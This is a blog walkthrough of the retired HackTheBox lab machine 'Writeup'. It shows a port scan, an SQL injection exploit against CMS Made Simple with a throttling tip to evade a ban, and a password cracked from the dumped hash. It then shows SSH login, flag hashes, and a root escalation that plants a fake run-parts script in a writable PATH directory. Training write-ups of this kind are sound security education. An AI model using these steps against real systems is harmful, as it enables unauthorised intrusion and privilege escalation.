<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en-US lang=en-US><head><title itemprop=name>Writeup :: Sequr</title>
<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=robots content="noodp, noydir"><meta name=googlebot content="noodp, noydir"><meta name=url content="https://sequr.be/blog/2019/08/writeup/" itemprop=url><link rel=icon href=/favicon.ico><meta itemprop=name content="Writeup"><meta itemprop=description content="Write-up of the Writeup lab machine by jkr on HackTheBox.eu. Owned user and root."><meta itemprop=datePublished content="2019-08-08T21:00:10+00:00"><meta itemprop=dateModified content="2019-08-08T21:00:10+00:00"><meta itemprop=wordCount content="937"><meta itemprop=image content="https://sequr.be/img/htb-writeup.png"><meta itemprop=keywords content="Writeup,HackTheBox.eu,Machine,Jkr"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://sequr.be/img/htb-writeup.png"><meta name=twitter:title content="Writeup"><meta name=twitter:description content="Write-up of the Writeup lab machine by jkr on HackTheBox.eu. Owned user and root."><meta property="og:url" content="https://sequr.be/blog/2019/08/writeup/"><meta property="og:site_name" content="Sequr"><meta property="og:title" content="Writeup"><meta property="og:description" content="Write-up of the Writeup lab machine by jkr on HackTheBox.eu. Owned user and root."><meta property="og:locale" content="en_US"><meta property="og:type" content="article"><meta property="article:section" content="blog"><meta property="article:published_time" content="2019-08-08T21:00:10+00:00"><meta property="article:modified_time" content="2019-08-08T21:00:10+00:00"><meta property="article:tag" content="Writeup"><meta property="article:tag" content="HackTheBox.eu"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Jkr"><meta property="og:image" content="https://sequr.be/img/htb-writeup.png"><meta property="og:see_also" content="https://sequr.be/blog/2020/06/nest/"><meta property="og:see_also" content="https://sequr.be/blog/2020/05/quickr/"><meta property="og:see_also" content="https://sequr.be/blog/2020/05/openadmin/"><meta property="og:see_also" content="https://sequr.be/blog/2020/04/sauna/"><meta property="og:see_also" content="https://sequr.be/blog/2020/03/infiltration/"><meta property="og:see_also" content="https://sequr.be/blog/2020/03/easy-phish/"><meta property="og:see_also" content="https://sequr.be/blog/2020/03/traceback/"><meta name=description content="Write-up of the Writeup lab machine by jkr on HackTheBox.eu. Owned user and root."><meta property="og:updated_time" content="2019-08-08T21:00:10Z"><link rel=sitemap type=application/xml title=Sitemap href=https://sequr.be/sitemap.xml><meta name=apple-mobile-web-app-title content="Writeup"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black"><link rel=webmention href=https://webmention.io/sequr.be/webmention><link rel=stylesheet href=/css/bundle.min.5413e5ca00ec5b64f3085a23bc75bd1a5f085d8434d4c0f6bfce3a80dab3fbf8.css integrity="sha256-VBPlygDsW2TzCFojvHW9Gl8IXYQ01MD2v846gNqz+/g=" crossorigin=anonymous><script defer type=text/javascript src=/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js integrity="sha256-FFRTJhp3VfUEKoVMQhNQHSFaj740wI0YHED4A/ExXnQ=" crossorigin=anonymous></script></head><body class=dark-theme><div class=wrapper><aside class="sidebar h-card background-image"><div class="container sidebar-sticky"><div class=light-dark align=right><button class=btn-light-dark title="Toggle light/dark mode"><svg class="moon" width="1em" height="1em" viewBox="0 0 16 16"><path fill="currentcolor" d="M6 .278a.768.768.0 01.08.858 7.208 7.208.0 00-.878 3.46c0 4.021 3.278 7.277 7.318 7.277.527.0 1.04-.055 1.533-.16a.787.787.0 01.81.316.733.733.0 01-.031.893A8.349 8.349.0 018.344 16C3.734 16 0 12.286.0 7.71.0 4.266 2.114 1.312 5.124.06A.752.752.0 016 .278z"/></svg><svg class="sun" width="1em" height="1em" viewBox="0 0 16 16"><path fill="currentcolor" d="M8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.5.5.0 01.5.5v2a.5.5.0 01-1 0v-2A.5.5.0 018 0zm0 13a.5.5.0 01.5.5v2a.5.5.0 01-1 0v-2A.5.5.0 018 13zm8-5a.5.5.0 01-.5.5h-2a.5.5.0 010-1h2a.5.5.0 01.5.5zM3 8a.5.5.0 01-.5.5h-2a.5.5.0 010-1h2A.5.5.0 013 8zm10.657-5.657a.5.5.0 010 .707l-1.414 1.415a.5.5.0 11-.707-.708l1.414-1.414a.5.5.0 01.707.0zm-9.193 9.193a.5.5.0 010 .707L3.05 13.657a.5.5.0 01-.707-.707l1.414-1.414a.5.5.0 01.707.0zm9.193 2.121a.5.5.0 01-.707.0l-1.414-1.414a.5.5.0 01.707-.707l1.414 1.414a.5.5.0 010 .707zM4.464 4.465a.5.5.0 01-.707.0L2.343 3.05a.5.5.0 11.707-.707l1.414 1.414a.5.5.0 010 .708z"/></svg></button></div><div class="sidebar-about hcard"><h1 class=brand><a href=https://sequr.be/><img src=/logo.png class="u-logo u-photo" alt="Sequr brand image">
</a><a href=https://sequr.be/ class="u-url p-org"><h1>Sequr</h1></a></h1><p class="lead p-note">Writeups and random stuff about infosec and life</p></div><nav><ul class=sidebar-nav><li class=heading><a href=/about/ title=About>About</a></li><li class=heading><a href=/blog/ title=Blog>Blog</a></li><li class=sub-heading>Recent</li><li class=bullet><a href=/blog/2025/01/sending-my-first-webmention-from-scratch/ title="Sending my first webmention from scratch" hreflang=en>My first Webmention</a></li><li class=bullet><a href=/blog/2025/01/bridging-this-blog-with-the-fediverse/ title="Bridging this blog with the Fediverse" hreflang=en>Briding with the Fediverse</a></li><li class=bullet><a href=/blog/2025/01/new-year-new-theme-for-the-site/ title="New year, new theme for the site" hreflang=en>New theme</a></li><li class=heading><a href=/shoppinglist/ title=Shopping>Shopping</a></li><li class=heading><a href=/privacy/ title=Privacy>Privacy</a></li></ul></nav><a target=_blank class=social title="Atom Feed" href=/atom.xml><svg width="1em" height="1.2em" viewBox="0 0 1280 1280"><g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentcolor"><path d="M2295 11929c-284-12-642-45-707-65-17-5-18-63-18-1039 0-569 4-1036 8-1039 5-3 74 6 153 19 510 86 1168 95 1789 25 1348-153 2602-677 3670-1531 385-308 820-744 1126-1129 842-1060 1362-2313 1514-3650 70-621 61-1279-25-1789-13-79-22-148-19-153 3-4 471-8 1039-8h1035l5 23c51 225 85 942 67 1419-23 605-77 1044-198 1617-294 14e2-927 2734-1823 3846-1043 1295-2364 2259-3909 2854-1158 447-2451 656-3707 6e2z"/><path d="M2255 7845c-269-25-620-81-667-106-17-9-18-55-18-899 0-706 3-890 13-890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207-107 2267-823 2814-1902 166-327 268-637 330-1001 38-227 48-384 42-662-8-348-44-590-126-831-23-66-41-126-41-132 0-10 184-13 890-13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782-59 703-233 1323-545 1945-481 956-1313 1788-2270 2268-620 310-1239 483-1940 542-165 14-669 10-840-5z"/><path d="M2519 3815c-391-66-725-336-868-703-79-201-96-462-45-677 83-344 338-641 666-774 116-47 205-69 330-80 412-39 811 153 1040 5e2 193 292 240 648 128 981-135 403-492 699-914 757-1e2 14-241 12-337-4z"/></g></svg></a><a href=https://bsky.app/profile/sequr.be target=_blank class="u-url social" rel="external noopener me" title=Bluesky><svg width="1.2em" height="1.2em" viewBox="0 0 568 501"><path fill="currentcolor" d="M123.121 33.6637C188.241 82.5526 258.281 181.681 284 234.873c25.719-53.192 95.759-152.3204 160.879-201.2093C491.866-1.61183 568-28.9064 568 57.9464 568 75.2916 558.055 203.659 552.222 224.501c-20.275 72.453-94.155 90.933-159.875 79.748C507.222 323.8 536.444 388.56 473.333 453.32c-119.86 122.992-172.272-30.859-185.702-70.281C285.169 375.812 284.017 372.431 284 375.306 283.983 372.431 282.831 375.812 280.369 383.039c-13.43 39.422-65.842 193.273-185.7023 70.281C31.5556 388.56 60.7778 323.8 175.653 304.249 109.933 315.434 36.0535 296.954 15.7778 224.501 9.94525 203.659.0 75.2916.0 57.9464.0-28.9064 76.1345-1.61183 123.121 33.6637z"/></svg></a><a href=https://mastodon-belgium.be/@TerraGloba target=_blank class="u-url social" rel="external noopener me" title=Mastodon>
<svg width="1.2em" height="1.2em" viewBox="0 0 24 24"><path fill="currentcolor" d="M20.94 14c-.28 1.41-2.44 2.96-4.97 3.26-1.31.15-2.6.3-3.97.24-2.25-.11-4-.54-4-.54v.62c.32 2.22 2.22 2.35 4.03 2.42 1.82.05 3.44-.46 3.44-.46l.08 1.65s-1.28.68-3.55.81c-1.25.07-2.81-.03-4.62-.5-3.92-1.05-4.6-5.24-4.7-9.5l-.01-3.43c0-4.34 2.83-5.61 2.83-5.61C6.95 2.3 9.41 2 11.97 2h.06c2.56.0 5.02.3 6.47.96.0.0 2.83 1.27 2.83 5.61.0.0.04 3.21-.39 5.43M18 8.91c0-1.08-.3-1.91-.85-2.56-.56-.63-1.3-.96-2.23-.96-1.06.0-1.87.41-2.42 1.23l-.5.88-.5-.88c-.56-.82-1.36-1.23-2.43-1.23-.92.0-1.66.33-2.23.96C6.29 7 6 7.83 6 8.91v5.26h2.1V9.06c0-1.06.45-1.62 1.36-1.62 1 0 1.5.65 1.5 1.93v2.79h2.07V9.37c0-1.28.5-1.93 1.51-1.93.9.0 1.35.56 1.35 1.62v5.11H18V8.91z"/></svg></a><a href=https://github.com/TheGroundZero target=_blank class="u-url social" rel="external noopener me" title=Github><svg width="1.2em" height="1.2em" viewBox="-2 -2 24 24"><path fill="currentcolor" d="M18.88 1.099C18.147.366 17.265.0 16.233.0H3.746C2.714.0 1.832.366 1.099 1.099.366 1.832.0 2.714.0 3.746v12.487c0 1.032.366 1.914 1.099 2.647.733.733 1.615 1.099 2.647 1.099H6.66c.19.0.333-.007.429-.02a.504.504.0 00.286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555.0 01-.904-.091 2.026 2.026.0 01-.872-.39 1.651 1.651.0 01-.572-.8l-.13-.3a3.25 3.25.0 00-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956.0 01-.17-.156.723.723.0 01-.117-.182c-.026-.061-.004-.111.065-.15.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1.0 01.631.677c.2.355.44.626.722.813.282.186.566.28.852.28.286.0.533-.022.742-.065a2.59 2.59.0 00.585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907.0 01-1.333-.234 5.314 5.314.0 01-1.223-.507 3.5 3.5.0 01-1.047-.872c-.277-.347-.505-.802-.683-1.365-.177-.564-.266-1.215-.266-1.952.0-1.049.342-1.942 1.027-2.68-.32-.788-.29-1.673.091-2.652.252-.079.625-.02 1.119.175.494.195.856.362 1.086.5.23.14.414.257.553.352a9.233 9.233.0 012.497-.338c.859.0 1.691.113 2.498.338l.494-.312a6.997 6.997.0 011.197-.572c.46-.174.81-.221 1.054-.143.39.98.424 1.864.103 2.653.685.737 1.028 1.63 1.028 2.68.0.737-.089 1.39-.267 1.957-.177.568-.407 1.023-.689 1.366a3.65 3.65.0 01-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9.0 01-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36.0 00.208.189c.096.034.18.056.254.064.074.01.18.013.318.013h2.914c1.032.0 1.914-.366 2.647-1.099.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/></svg></a><a href=https://twitter.com/DezeStijn target=_blank class="u-url social" rel="external noopener me" title=Twitter><svg width="1.2em" height="1.2em" viewBox="0 0 16 16"><path fill="currentcolor" d="M5.032 14.286c6.037.0 9.34-4.837 9.34-9.032.0-.137.0-.274-.01-.41A6.56 6.56.0 0016 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207.0 001.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322.0 00-1.862-.958 3.384 3.384.0 00-2.082.334 3.223 3.223.0 00-1.442 1.49 3.08 3.08.0 00-.208 2.03 9.57 9.57.0 01-3.747-.963A9.269 9.269.0 011.114 2.292a3.086 3.086.0 00-.36 2.314c.189.787.68 1.475 1.376 1.924A3.344 3.344.0 01.64 6.132v.04c0 .734.263 1.444.743 2.01a3.3 3.3.0 001.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19.0 001.168 1.577 3.36 3.36.0 001.9.627A6.732 6.732.0 010 12.86a9.527 9.527.0 005.032 1.423"/></svg></a><a href=https://ko-fi.com/s4squatch target=_blank class="u-url social" rel="external noopener" title=Kofi><svg width="1.2em" height="1.2em" viewBox="0 0 24 24"><path fill="currentcolor" d="M23.881 8.948c-.773-4.085-4.859-4.593-4.859-4.593H.723c-.604.0-.679.798-.679.798s-.082 7.324-.022 11.822c.164 2.424 2.586 2.672 2.586 2.672s8.267-.023 11.966-.049c2.438-.426 2.683-2.566 2.658-3.734 4.352.24 7.422-2.831 6.649-6.916zm-11.062 3.511c-1.246 1.453-4.011 3.976-4.011 3.976s-.121.119-.31.023c-.076-.057-.108-.09-.108-.09-.443-.441-3.368-3.049-4.034-3.954-.709-.965-1.041-2.7-.091-3.71.951-1.01 3.005-1.086 4.363.407.0.0 1.565-1.782 3.468-.963 1.904.82 1.832 3.011.723 4.311zm6.173.478c-.928.116-1.682.028-1.682.028V7.284h1.77s1.971.551 1.971 2.638c0 1.913-.985 2.667-2.059 3.015z"/></svg></a><p class=footnote>&copy; 2019
• <a class="p-name u-url" href=https://sequr.be>Sequr</a>
• <a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank rel="external noopener">CC BY-NC-SA 4.0</a></p><a href=https://sequr.be/en hreflang=en-US title=English class=u-translation-of rel=alternate><span class="flag fi fi-gb"></span>
</a><a href=https://sequr.be/nl hreflang=nl-BE title=Nederlands class=u-translation-of rel=alternate><span class="flag fi fi-nl"></span></a></div></aside><section class="content container"><article class="post h-entry"><header class=info><h1 class="post-title p-name u-url"><a href=https://sequr.be/blog/2019/08/writeup/ rel=bookmark>Writeup</a></h1><div class=headline><div><span class="h-card p-author">DezeStijn
</span><span class=whitespace>• </span><time datetime=2019-08-08T21:00:10Z class="post-date dt-published">Aug 8, 2019
</time><span class=whitespace>• </span><span class=reading-time><span>5 mins read</span></span></div><ul class=tags><li class=tag-Cybersecurity><a class=p-category href=https://sequr.be/categories/cybersecurity>Cybersecurity</a></li></ul></div><p class=seriesname>Series: <a class=p-category href=https://sequr.be/series/hack-the-box>Hack The Box</a></p></header><main class=e-content><p><strong>Note to fellow-HTBers:</strong> Only write-ups of retired HTB machines or challenges are allowed.</p><p><a href=https://www.hackthebox.eu/home/machines/profile/192%22 rel=external target=_blank>Writeup</a> by jkr (10.10.10.138)</p><h2 id=tools-used>Tools used</h2><ul><li>nmap</li><li><a href=https://www.wappalyzer.com/%22 rel=external target=_blank>Wappalyzer</a></li><li><a href=https://www.exploit-db.com%22 rel=external target=_blank>Exploit-db</a></li><li><a href=https://github.com/DominicBreuker/pspy%22 rel=external target=_blank>pspy</a></li><li><a href=https://github.com/diego-treitos/linux-smart-enumeration%22 rel=external target=_blank>Linux Smart Enumeration (lse)</a></li></ul><h2 id=recon>Recon</h2><h3 id=nmap>Nmap</h3><p>As usual, we kick off with a Nmap scan.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ nmap -v -p- -oN scanning/nmap_allports -T4 --append-output 10.10.10.138
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.138
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.028s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65533</span> filtered ports
</span></span><span style=display:flex><span>PORT   STATE SERVICE
</span></span><span style=display:flex><span>22/tcp open  ssh
</span></span><span style=display:flex><span>80/tcp open  http
</span></span></code></pre></div><h2 id=having-a-look-at-port-80>Having a look at port 80</h2><p>Since port 80 is open, we&rsquo;ll have a look at the website.</p><figure class=center><img src=/img/htb-writeup-img1.png><figcaption class=center>Homepage of Writeup website</figcaption></figure><p>From the homepage we learn that the server is running some DoS protection (Donkey DoS protection). So we&rsquo;ll probably have to limit the speed of certain automated tools to prevent us from getting banned/blocked.</p><p>If you use a tool like Burp or are used to doing some initial recon on web applications, you will probably have noticed there&rsquo;s a robots.txt file present on this website.
The robots.txt file often give web admins a false sense of security as they&rsquo;ll add sensitive URLs in here because they don&rsquo;t want (good) bots from visiting them.</p><pre tabindex=0><code>#              __
#      _(\    |@@|
#     (__/\__ \--/ __
#        \___|----|  |   __
#            \ }{ /\ )_ / _\
#            /\__/\ \__O (__
#           (--/\--)    \__/
#           _)(  )(_
#          `---&#39;&#39;---`

# Disallow access to the blog until content is finished.
User-agent: * 
Disallow: /writeup/
</code></pre><p>Since we aren&rsquo;t bots, we don&rsquo;t adhere to the limits of robots.txt and have a look at /writeup/.</p><figure class=center><img src=/img/htb-writeup-img2.png><figcaption class=center>/writeup/ at Writeup host</figcaption></figure><p>While the homepage was hand-crafted with vi, this page apparently isn&rsquo;t (see the footer).</p><p><a href=https://www.cmsmadesimple.org/%22 rel=external target=_blank>CMS Made Simple</a>.<br>You could&rsquo;ve also discovered this looking at the HTML head:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>meta</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Generator&#34;</span> <span style=color:#a6e22e>content</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.&#34;</span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h2 id=exploiting>Exploiting</h2><p>Let&rsquo;s have a look at <a href="https://www.exploit-db.com/?q=cms%20made%20simple%22" rel=external target=_blank>Exploit-db</a> and let&rsquo;s look for exploits that don&rsquo;t require to be authenticated (since we don&rsquo;t have any credentials yet).<br>&ldquo;<a href=https://www.exploit-db.com/exploits/46635%22 rel=external target=_blank>CMS Made Simple &lt; 2.2.10 - SQL Injection</a>&rdquo; looks promising.</p><p>You&rsquo;ll have to update the value of the <code>TIME</code> variable in the script, or the Donkey DoS protection will ban your IP. Changing this value to 5 sufficed in my case.</p><p>I ran the script without cracking and copied the cracking code to do the cracking independently because I didn&rsquo;t have a wordlist ready.
However, you can easily do the cracking immediatly by passing the <code>--crack</code> and <code>-w</code> parameters.<br>Don&rsquo;t forget to pass the full URL to the CMS Made Simple application.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ python exploit.py -u http://10.10.10.138/writeup/ --crack -w /usr/share/wordlists/rockyou.txt
</span></span><span style=display:flex><span> <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Salt <span style=color:#66d9ef>for</span> password found: 5a599ef579066807
</span></span><span style=display:flex><span> <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Username found: jkr
</span></span><span style=display:flex><span> <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Email found: jkr@writeup.htb
</span></span><span style=display:flex><span> <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Password found: 62def4866937f08cc13bab43bb14e6f7
</span></span><span style=display:flex><span> <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Password cracked: raykayjay9
</span></span></code></pre></div><h2 id=-getting-the-user-flag>$ Getting the user flag</h2><p>SSH onto the box with these credentials and get the user flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ ssh jkr@10.10.10.138
</span></span><span style=display:flex><span>jkr@writeup:~$ cat user.txt 
</span></span><span style=display:flex><span> d4e493fd4068afc9eb1aa6a55319f978
</span></span></code></pre></div><h2 id=going-for-root>Going for root</h2><p>I have to admit I peeked at the HTB forum for this part. And it appears many people have had to.<br>The reason for this is that you need to get some traffic onto the machine to be able to get a hint towards getting root.</p><h3 id=mind-your-path>Mind your $PATH</h3><p>Upload and launch <a href=https://github.com/DominicBreuker/pspy%22 rel=external target=_blank>pspy64</a> onto the machine and have a look at the processes and their parameters.</p><p>Can you spot what&rsquo;s dangerous in this command?</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>sh -c /usr/bin/env -i PATH<span style=color:#f92672>=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new
</span></span></code></pre></div><p>You may notice that this command passes a custom <code>$PATH</code> and then calls another command (<code>run-parts</code>) without specifying a direct path to the script, thus relying on finding the command in the <code>$PATH</code>.
It then stores the output of this command in the MotD (Message of the Day).</p><p>You can go thorugh each of the directories in this <code>$PATH</code> or run <a href=https://github.com/diego-treitos/linux-smart-enumeration%22 rel=external target=_blank>Linux Smart Enumeration (lse)</a>
to find a directory within the path in which we have write permissions.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>jkr@writeup:~$ bash lse.sh -l <span style=color:#ae81ff>2</span> -s fst000
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>If you know the current user password, write it here <span style=color:#66d9ef>for</span> better results: raykayjay9
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        User: jkr
</span></span><span style=display:flex><span>     User ID: <span style=color:#ae81ff>1000</span>
</span></span><span style=display:flex><span>    Password: ******
</span></span><span style=display:flex><span>        Home: /home/jkr
</span></span><span style=display:flex><span>        Path: /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</span></span><span style=display:flex><span>       umask: <span style=color:#ae81ff>0022</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Hostname: writeup
</span></span><span style=display:flex><span>       Linux: 4.9.0-8-amd64
</span></span><span style=display:flex><span>Distribution: Devuan GNU/Linux ascii
</span></span><span style=display:flex><span>Architecture: x86_64
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>============================================================(</span> file system <span style=color:#f92672>)=====</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> fst000 Writable files outside user<span style=color:#960050;background-color:#1e0010>&#39;</span>s home.............................. yes!
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>/var/local
</span></span><span style=display:flex><span>/var/lib/php/sessions
</span></span><span style=display:flex><span>/var/tmp
</span></span><span style=display:flex><span>/usr/local
</span></span><span style=display:flex><span>/usr/local/bin
</span></span><span style=display:flex><span>/usr/local/include
</span></span><span style=display:flex><span>/usr/local/share
</span></span><span style=display:flex><span>/usr/local/share/sgml
</span></span><span style=display:flex><span>/usr/local/share/sgml/misc
</span></span><span style=display:flex><span>/usr/local/share/sgml/stylesheet
</span></span><span style=display:flex><span>/usr/local/share/sgml/entities
</span></span><span style=display:flex><span>/usr/local/share/sgml/dtd
</span></span><span style=display:flex><span>/usr/local/share/sgml/declaration
</span></span><span style=display:flex><span>/usr/local/share/fonts
</span></span><span style=display:flex><span>/usr/local/share/man
</span></span><span style=display:flex><span>/usr/local/share/emacs
</span></span><span style=display:flex><span>/usr/local/share/emacs/site-lisp
</span></span><span style=display:flex><span>/usr/local/share/xml
</span></span><span style=display:flex><span>/usr/local/share/xml/schema
</span></span><span style=display:flex><span>/usr/local/share/xml/misc
</span></span><span style=display:flex><span>/usr/local/share/xml/entities
</span></span><span style=display:flex><span>/usr/local/share/xml/declaration
</span></span><span style=display:flex><span>/usr/local/games
</span></span><span style=display:flex><span>/usr/local/src
</span></span><span style=display:flex><span>/usr/local/etc
</span></span><span style=display:flex><span>/usr/local/lib
</span></span><span style=display:flex><span>/usr/local/lib/python3.5
</span></span><span style=display:flex><span>/usr/local/lib/python3.5/dist-packages
</span></span><span style=display:flex><span>/usr/local/lib/python2.7
</span></span><span style=display:flex><span>/usr/local/lib/python2.7/dist-packages
</span></span><span style=display:flex><span>/usr/local/lib/python2.7/site-packages
</span></span><span style=display:flex><span>/usr/local/sbin
</span></span><span style=display:flex><span>/home/jkr
</span></span><span style=display:flex><span>/tmp
</span></span><span style=display:flex><span>/tmp/.sw
</span></span><span style=display:flex><span>/tmp/.sw/sw.sh
</span></span><span style=display:flex><span>/tmp/.sw/sw2.sh
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>==================================(</span> FINISHED <span style=color:#f92672>)==================================</span>
</span></span></code></pre></div><h3 id=-getting-the-root-flag># Getting the root flag</h3><p>Since <code>/usr/local/sbin</code> is writeable, we can add a script <code>run-parts</code> in which we output the content of the root flag file. This output will be added to the MotD which will be printed in the hello message of any user SSHing onto the box. Make sure the script is executable. Logout from the host and re-login or login from another terminal (tab).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>jkr@writeup:~$ nano /usr/local/sbin/run-parts
</span></span><span style=display:flex><span><span style=color:#75715e>#!/bin/bash</span>
</span></span><span style=display:flex><span>ls /root/
</span></span><span style=display:flex><span>cat /root/root.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>jkr@writeup:~$ chmod +x /usr/local/sbin/run-parts
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ ssh jkr@10.10.10.138
</span></span><span style=display:flex><span>jkr@10.10.10.138<span style=color:#960050;background-color:#1e0010>&#39;</span>s password: 
</span></span><span style=display:flex><span>bin
</span></span><span style=display:flex><span>root.txt
</span></span><span style=display:flex><span>eeba47f60b48ef92b734f9b6198d7226
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>The programs included with the Devuan GNU/Linux system are free software;
</span></span><span style=display:flex><span>the exact distribution terms <span style=color:#66d9ef>for</span> each program are described in the
</span></span><span style=display:flex><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span style=display:flex><span>permitted by applicable law.
</span></span></code></pre></div><p>You could ofcourse also print the content of the root.txt file into a file on <code>/tmp/</code>. However, make sure you delete the file as soon as you copied the flag so you don&rsquo;t spoil it for the others. The file will be created by root, so you&rsquo;ll need to reuse the ‘exploit&rsquo; to delete the file.</p><blockquote><p>The only way of discovering the limits of the possible is to venture a little way past them into the impossible.</p><p>~ Arthur C. Clarke</p></blockquote></main><hr><footer><div class=footer><p>This is a post in the <span style=font-weight:700><a href=https://sequr.be/series/hack-the-box>Hack The Box</a></span> series.<br>Other posts in this series:<ul class=series><li>Jun 8, 2020 -
<a href=/blog/2020/06/nest/>Nest</a></li><li>May 10, 2020 -
<a href=/blog/2020/05/quickr/>QuickR</a></li><li>May 4, 2020 -
<a href=/blog/2020/05/openadmin/>Openadmin</a></li><li>Apr 21, 2020 -
<a href=/blog/2020/04/sauna/>Sauna</a></li><li>Mar 26, 2020 -
<a href=/blog/2020/03/infiltration/>Infiltration</a></li><li>Mar 26, 2020 -
<a href=/blog/2020/03/easy-phish/>Easy Phish</a></li><li>Mar 18, 2020 -
<a href=/blog/2020/03/traceback/>Traceback</a></li><li>Jan 24, 2020 -
<a href=/blog/2020/01/traverxec/>Traverxec</a></li><li>Nov 20, 2019 -
<a href=/blog/2019/11/m0rsarchive/>M0rsarchive</a></li><li>Nov 19, 2019 -
<a href=/blog/2019/11/freelancer/>FreeLancer</a></li><li>Nov 18, 2019 -
<a href=/blog/2019/11/networked/>Networked</a></li><li>Sep 4, 2019 -
<a href=/blog/2019/09/crooked-crockford/>Crooked Crockford</a></li><li>Sep 4, 2019 -
<a href=/blog/2019/09/blackhole/>Blackhole</a></li><li>Sep 4, 2019 -
<a href=/blog/2019/09/longbottoms-locker/>Longbottom’s Locker</a></li><li>Sep 4, 2019 -
<a href=/blog/2019/09/eternal-loop/>Eternal Loop</a></li><li>Sep 4, 2019 -
<a href=/blog/2019/09/misdirection/>misDIRection</a></li><li>Sep 4, 2019 -
<a href=/blog/2019/09/inferno/>Inferno</a></li><li>Sep 3, 2019 -
<a href=/blog/2019/09/art/>Art</a></li><li>Aug 25, 2019 -
<a href=/blog/2019/08/0ld-is-g0ld/>0ld is g0ld</a></li><li>Aug 24, 2019 -
<a href=/blog/2019/08/fs0ciety/>fs0ciety</a></li><li>Aug 23, 2019 -
<a href=/blog/2019/08/i-know-mag1k/>I know Mag1k</a></li><li>Aug 22, 2019 -
<a href=/blog/2019/08/lernaean/>Lernaean</a></li><li>Aug 21, 2019 -
<a href=/blog/2019/08/fuzzy/>Fuzzy</a></li><li>Aug 20, 2019 -
<a href=/blog/2019/08/cartographer/>Cartographer</a></li><li>Aug 13, 2019 -
<a href=/blog/2019/08/emdee-five-for-life/>Emdee five for life</a></li><li>Aug 8, 2019 -
Writeup</li><li>Aug 7, 2019 -
